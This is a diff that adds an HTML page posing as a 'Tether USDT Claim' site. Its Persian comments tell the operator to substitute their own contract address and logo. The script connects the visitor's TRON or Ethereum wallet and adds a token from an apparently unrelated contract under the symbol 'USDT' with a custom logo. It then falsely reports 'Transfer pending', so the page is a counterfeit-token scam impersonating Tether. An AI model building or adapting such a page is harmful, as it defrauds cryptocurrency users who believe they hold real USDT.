@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether USDT Claim</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb/tronweb@latest/dist/tronweb.js"></script>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #fff;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: linear-gradient(135deg, #fff, #f9f9f9);
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 2.2em;
+            color: #f7931a; /* رنگ نارنجی تتر */
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        p {
+            font-size: 1.1em;
+            margin-bottom: 20px;
+            color: #666;
+        }
+        button {
+            background-color: #f7931a; /* نارنجی تتر */
+            color: #fff;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1.1em;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+            font-weight: 600;
+        }
+        button:hover {
+            background-color: #e68a00;
+            transform: translateY(-2px);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 1em;
+            color: #28a745;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        #status.show {
+            opacity: 1;
+        }
+        .error {
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://yourusername.github.io/my-dapp/tether-logo.png" alt="Tether Logo" class="logo">
+        <h1>Tether USDT Claim</h1>
+        <p>Connect your wallet to claim your exclusive USDT tokens.</p>
+        <button onclick="connectWallet()">Connect Wallet to Claim USDT</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        const contractAddress = "TNvrB8QfGowmCNvXYFJuTZQ1DuGNj1eq22"; // آدرس قراردادت
+        const logoUrl = "https://yourusername.github.io/my-dapp/logo.png"; // لوگوی آپلودشده (اسم کاربریت رو عوض کن)
+        const abi = [
+            {"stateMutability": "Nonpayable", "type": "Constructor"},
+            {"anonymous": false, "inputs": [{"indexed": true, "name": "owner", "type": "address"}, {"indexed": true, "name": "spender", "type": "address"}, {"indexed": false, "name": "value", "type": "uint256"}], "name": "Approval", "type": "Event"},
+            {"anonymous": false, "inputs": [{"indexed": true, "name": "from", "type": "address"}, {"indexed": true, "name": "to", "type": "address"}, {"indexed": false, "name": "value", "type": "uint256"}], "name": "Transfer", "type": "Event"},
+            {"constant": true, "inputs": [{"name": "", "type": "address"}, {"name": "", "type": "address"}], "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "View", "type": "Function"},
+            {"constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "success", "type": "bool"}], "stateMutability": "Nonpayable", "type": "Function"},
+            {"constant": true, "inputs": [{"name": "", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "View", "type": "Function"},
+            {"constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "stateMutability": "View", "type": "Function"},
+            {"constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "stateMutability": "View", "type": "Function"},
+            {"constant": true, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "stateMutability": "View", "type": "Function"},
+            {"constant": true, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "View", "type": "Function"},
+            {"constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "success", "type": "bool"}], "stateMutability": "Nonpayable", "type": "Function"},
+            {"constant": false, "inputs": [{"name": "_from", "type": "address"}, {"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "success", "type": "bool"}], "stateMutability": "Nonpayable", "type": "Function"}
+        ];
+
+        async function connectWallet() {
+            if (window.tronWeb || window.ethereum) {
+                try {
+                    let tronWeb;
+                    if (window.tronWeb) {
+                        tronWeb = window.tronWeb; // استفاده از TronLink
+                    } else if (window.ethereum) {
+                        tronWeb = new TronWeb({
+                            fullHost: 'https://api.trongrid.io',
+                        });
+                        await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    }
+                    const accounts = await tronWeb.trx.getAccount();
+                    const address = accounts.address;
+                    const userAddress = tronWeb.address.fromHex(address);
+                    const status = document.getElementById('status');
+                    status.innerText = `Wallet Connected! Address: ${userAddress.substring(0, 6)}...${userAddress.slice(-4)}`;
+                    status.className = 'show';
+
+                    // پیشنهاد اضافه کردن توکن با متادیتا
+                    await tronWeb.request({
+                        method: 'wallet_watchAsset',
+                        params: {
+                            type: 'TRC20',
+                            options: {
+                                address: contractAddress,
+                                symbol: 'USDT',
+                                decimals: 6,
+                                image: logoUrl
+                            }
+                        }
+                    });
+                    status.innerText = "Success! USDT with custom logo added. Transfer pending...";
+                } catch (error) {
+                    const status = document.getElementById('status');
+                    status.innerText = "Error: " + error.message;
+                    status.className = 'show error';
+                }
+            } else {
+                const status = document.getElementById('status');
+                status.innerText = "Please install Trust Wallet or TronLink!";
+                status.className = 'show error';
+            }
+        }
+    </script>
+</body>
+</html>
